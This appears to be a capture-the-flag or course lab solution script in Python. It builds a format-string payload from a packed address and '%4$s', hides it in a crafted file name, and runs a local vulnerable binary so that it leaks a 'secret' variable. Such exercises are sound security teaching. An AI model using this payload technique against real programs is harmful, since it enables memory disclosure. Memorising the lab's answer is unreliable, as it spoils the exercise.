#!/usr/bin/env python3
"""
Task 1: Read the 'secret' variable via format string vulnerability.

Creates task1/ directory, copies vuln + flag.txt into it,
renames flag.txt to the crafted payload filename, then runs vuln.

The filename content ("Welcome") stays the same - only the NAME changes.
"""
import os
import sys
import shutil
import struct

# ---- Configuration ----
TASK_DIR    = "task1"
VULN        = "vuln"
FLAGFILE    = "flag.txt"
SECRET_ADDR = 0x0804c060   # address of 'secret' variable
OFFSET      = 4            # buffer at printf's 4th stack position

# ---- Generate payload (= crafted filename) ----
payload  = struct.pack("<I", SECRET_ADDR)   # \x60\xc0\x04\x08
payload += f"%{OFFSET}$s".encode()          # %4$s
payload += b".txt"                          # required for strstr match

print(f"[+] Payload: {payload}")
print(f"[+] Payload length: {len(payload)} bytes")

# ---- Save payload_1 for submission ----
with open("payload_1", "wb") as f:
    f.write(payload)
print(f"[+] Saved raw payload to: payload_1")

# ---- Set up directory ----
if os.path.exists(TASK_DIR):
    shutil.rmtree(TASK_DIR)
os.makedirs(TASK_DIR)
print(f"[+] Created directory: {TASK_DIR}/")

shutil.copy2(VULN, TASK_DIR)
shutil.copy2(FLAGFILE, TASK_DIR)
os.chmod(os.path.join(TASK_DIR, VULN), 0o755)
print(f"[+] Copied {VULN} and {FLAGFILE} into {TASK_DIR}/")

# ---- Rename flag.txt to crafted payload filename ----
src = os.path.join(TASK_DIR, FLAGFILE)
# Use bytes path to handle non-ascii filename
dst = os.path.join(TASK_DIR.encode(), payload)
os.rename(src.encode(), dst)
print(f"[+] Renamed {FLAGFILE} -> crafted payload filename")
print(f"[+] File content remains: 'Welcome'")

# ---- Run vuln ----
print(f"\n[*] Running ./{VULN} in {TASK_DIR}/")
print("=" * 50)
os.chdir(TASK_DIR)
os.system(f"./{VULN}")
print("=" * 50)
print("[*] The secret value appeared in the output above")
